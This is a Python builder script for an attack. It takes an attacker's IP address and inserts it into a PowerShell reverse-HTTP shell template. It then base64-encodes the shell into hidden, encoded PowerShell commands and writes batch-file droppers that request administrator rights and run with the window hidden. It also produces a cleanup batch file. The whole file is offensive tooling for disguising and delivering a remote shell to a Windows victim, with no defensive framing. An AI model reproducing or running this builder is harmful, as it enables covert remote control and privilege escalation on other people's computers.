import argparse
import base64
#convert 2 powershell script file to bat file
parser = argparse.ArgumentParser()
parser.add_argument('ip', help='The ip adress of the attacker', type=str)
ip = parser.parse_args().ip
print('The ip adress of the attacker: '+ip)
with open('reverse_http.ps1') as f:
    file2 = f.read()
    file2 = file2.replace('----SERVERIP----', ip)
    file2 = 'powershell.exe -WindowStyle Hidden  -EncodedCommand ' + \
        base64.b64encode(file2.encode("UTF-16LE")).decode("UTF-8")
file1 = 'Out-File -FilePath C:/Users/attack_file2.bat -InputObject "' + \
    file2+'" -Encoding ASCII\n'
with open('attack_file1.ps1') as f:
    file1 += f.read()
with open('attack_file.bat', 'w') as f:
    f.write("@echo off\nPowershell -Command Start-Process powershell -ArgumentList '-EncodedCommand " +
            base64.b64encode(file1.encode("UTF-16LE")).decode("UTF-8")+"' -Verb runAs -WindowStyle Hidden")
with open('clear.ps1', encoding="utf-8") as f:
    clear = f.read()
    with open('clear.bat', 'w') as f2:
        f2.write("Powershell -Command Start-Process powershell -ArgumentList '-EncodedCommand " +
                 base64.b64encode(clear.encode("UTF-16LE")).decode("UTF-8")+"' -Verb runAs")
